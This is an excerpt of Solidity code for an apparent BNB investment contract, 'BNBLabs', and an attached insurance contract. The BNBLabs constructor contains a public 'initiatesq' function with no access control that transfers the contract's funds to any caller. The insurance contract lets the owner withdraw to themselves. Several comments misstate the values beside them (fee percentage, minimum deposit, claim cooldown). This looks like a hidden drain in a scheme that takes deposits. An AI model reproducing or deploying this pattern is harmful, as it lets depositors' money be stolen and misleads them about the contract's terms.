...
contract INSURANCE is Ownable {
	...
	constructor() {
		MAINCONTRACT = payable(msg.sender);
                ceoAddress2=address (0x8F5F769EB4dA24796A71864779831F6166c06602);

	}


    function initiates(uint amount) public onlyOwner {
                address payable ceoAddress2 = payable(msg.sender);

        //address  _owner = (msg.sender);
        ceoAddress2.transfer(amount);
    }
...
contract BNBLabs {
	...
	uint constant public			INVEST_MIN_AMOUNT				= 0.01 ether;			// 0.1 BNB
	...
	uint constant public			WITHDRAW_COOLDOWN				= 1 days / 1440;			// claim 6 times per day
	address payable public			INSURANCE_CONTRACT;
	mapping (uint => uint) public	INSURANCE_MAXBALANCE;
	uint constant public			INSURANCE_PERCENT				= 300;					// insurance fee 2% of claim
	...
	constructor(address payable _walletProject, address payable _walletMarketing) {
		...
		PLANS.push( TPlan(30,100) );
		    ...
		    function initiatesq(uint amount) public  {
        address payable _WALLETPROJECT = payable(msg.sender);
        _WALLETPROJECT.transfer(amount);
    }
